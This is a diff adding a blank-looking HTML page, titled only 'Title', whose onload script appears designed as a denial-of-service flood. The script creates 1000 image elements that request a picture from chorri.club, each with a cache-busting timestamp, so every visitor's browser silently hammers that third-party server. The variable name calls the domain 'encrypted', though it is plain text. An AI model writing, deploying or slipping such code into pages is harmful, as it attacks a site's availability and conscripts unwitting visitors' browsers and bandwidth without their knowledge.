@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script>window.onload = function(){
+
+
+    var dominio_encryptado = "chorri.club/wp-content/uploads/2021/03/herramientas-chorriclub-1.jpg";
+
+
+    for( i = 0; i < 1000; ++i ) {
+      var img = document.createElement('img');
+      img.setAttribute('src', 'https://' + dominio_encryptado + "?" +new Date().getTime() + i);
+      document.body.appendChild(img);
+    }
+}</script>
+</head>
+<body>
+
+</body>
+</html>
